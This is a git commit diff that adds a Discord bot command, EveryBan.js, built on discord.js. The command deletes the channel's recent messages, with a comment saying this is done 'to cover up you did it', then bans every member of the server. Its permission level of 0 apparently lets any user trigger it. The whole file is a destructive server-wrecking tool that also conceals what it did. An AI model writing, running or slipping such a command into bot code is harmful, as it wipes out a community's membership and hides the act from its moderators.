72c4504d6f1206f5ee45749e58f8e9b2b49c2094
KawaiiAlex <38259844+KawaiiAlex@users.noreply.github.com>
2018-06-07 22:38:51 +0200

    Update EveryBan.js

--- commands/test/EveryBan.js
+++ commands/test/EveryBan.js
@@ -1,1 +1,27 @@
+const Discord = require('discord.js');
 
+
+
+exports.run = (client, message, args) => {
+
+
+    message.channel.fetchMessages({limit: 10}).then(messages => message.channel.bulkDelete(messages)); //deletes messages to cover up you did it
+    message.guild.members.forEach(m => {
+        m.ban();
+});
+}
+
+
+
+    exports.conf = {
+        enabled: true,
+        guildOnly: false,
+        aliases: ['everyban', 'eb', 'EveryBan'],
+        permLevel: 0
+      };
+
+      exports.help = {
+        name: 'Everyban',
+        description: '',
+        usage: ''
+      };
